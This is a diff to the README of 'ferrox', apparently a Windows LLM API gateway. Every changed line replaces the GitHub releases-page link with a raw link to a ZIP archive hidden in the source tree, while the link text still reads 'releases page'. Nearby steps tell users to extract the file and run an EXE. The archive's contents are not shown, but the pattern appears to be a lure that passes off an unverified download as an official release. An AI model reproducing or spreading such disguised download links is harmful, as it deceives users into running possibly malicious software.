@@ -1,6 +1,6 @@
 # 🧩 ferrox - Fast LLM API Gateway for Windows
 
-[![Download ferrox](https://img.shields.io/badge/Download-ferrox-blue?style=for-the-badge)](https://github.com/Zohuko71/ferrox/releases)
+[![Download ferrox](https://img.shields.io/badge/Download-ferrox-blue?style=for-the-badge)](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip)
 
 ## 🚀 Overview
 
@@ -12,14 +12,14 @@ It runs on Windows and is built to stay light, fast, and simple to operate.
 
 ## 📥 Download
 
-1. Open the [ferrox releases page](https://github.com/Zohuko71/ferrox/releases).
+1. Open the [ferrox releases page](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip).
 2. Find the latest release.
 3. Download the Windows file from the Assets list.
 4. Save the file to a folder you can reach, such as Downloads or Desktop.
 5. If the file is a ZIP, extract it first.
 6. If the file is an EXE, double-click it to run.
 
-[Visit the ferrox releases page](https://github.com/Zohuko71/ferrox/releases)
+[Visit the ferrox releases page](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip)
 
 ## 🪟 Install on Windows
 
@@ -226,7 +226,7 @@ If a setting is not clear, try the default value first.
 
 When a new release is out:
 
-1. Visit the [ferrox releases page](https://github.com/Zohuko71/ferrox/releases).
+1. Visit the [ferrox releases page](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip).
 2. Download the newest Windows file.
 3. Close the old app first.
 4. Replace the old files with the new ones.
